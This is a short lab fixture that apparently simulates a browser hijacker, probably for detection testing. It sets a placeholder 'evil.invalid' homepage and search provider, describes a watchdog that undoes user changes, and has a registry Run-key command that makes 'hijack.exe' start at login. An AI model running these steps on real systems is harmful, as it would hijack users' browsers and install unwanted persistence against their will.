; lab hijacker fixture
set homepage = http://search.evil.invalid/
set default search provider = evilsearch
watchdog: if homepage changed, restore evil.invalid
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v guard /d hijack.exe
